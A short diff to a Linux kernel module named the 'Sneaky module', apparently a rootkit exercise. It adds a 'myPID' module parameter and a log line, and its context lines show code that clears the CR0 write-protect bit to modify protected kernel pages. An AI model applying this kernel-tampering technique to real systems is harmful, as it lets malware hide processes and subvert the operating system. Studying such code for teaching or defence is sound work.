@@ -16,6 +16,17 @@
 #define read_cr0() (native_read_cr0())
 #define write_cr0(x) (native_write_cr0(x))
 
+/*
+module_param(foo, int 0000)
+First param is parameter's name
+Second param is data type
+Third param is permission bits
+*/
+
+static int myPID = 999;
+
+module_param(myPID, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
+
 //These are function pointers to the system calls that change page
 //permissions for the given address (page) to read-only or read-write.
 //Grep for "set_pages_ro" and "set_pages_rw" in:
@@ -50,6 +61,7 @@ static int initialize_sneaky_module(void)
 
   //See /var/log/syslog for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");
+  printk(KERN_INFO "LOADING PID=%d\n", myPID);
 
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
